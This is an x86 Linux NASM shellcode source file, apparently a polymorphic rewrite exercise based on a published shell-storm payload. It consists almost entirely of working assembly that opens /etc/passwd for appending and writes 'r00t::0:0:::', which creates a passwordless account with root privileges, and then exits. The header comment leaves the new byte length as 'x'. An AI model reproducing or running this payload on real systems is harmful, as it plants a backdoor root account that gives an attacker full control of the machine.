;Filename: root_user.nasm
;Nasm code obtained from: http://shell-storm.org/shellcode/files/shellcode-211.php
;Polymorphic version author: MrSquid

;Original Lenght: 69 bytes 

;Polymorphic version: x bytes

section .text

     global _start

_start:
	; open("/etc//passwd", O_WRONLY | O_APPEND)
	push byte +0x5
	pop eax
	xor ecx,ecx
	push ecx
	push dword 0x64777373
	push dword 0x61702f2f
	push dword 0x6374652f
	mov ebx,esp
	mov cx,0x401
	int 0x80

	; write(ebx, "r00t::0:0:::", 12)
	mov ebx,eax
	push byte +0x4
	pop eax
	xor edx,edx
	push edx
	push dword 0x3a3a3a30
	push dword 0x3a303a3a
	push dword 0x74303072
	mov ecx,esp
	push byte +0xc
	pop edx
	int 0x80

	; close(ebx)
	push byte +0x6
	pop eax
	int 0x80

	; exit()
	push byte +0x1
	pop eax
	int 0x80

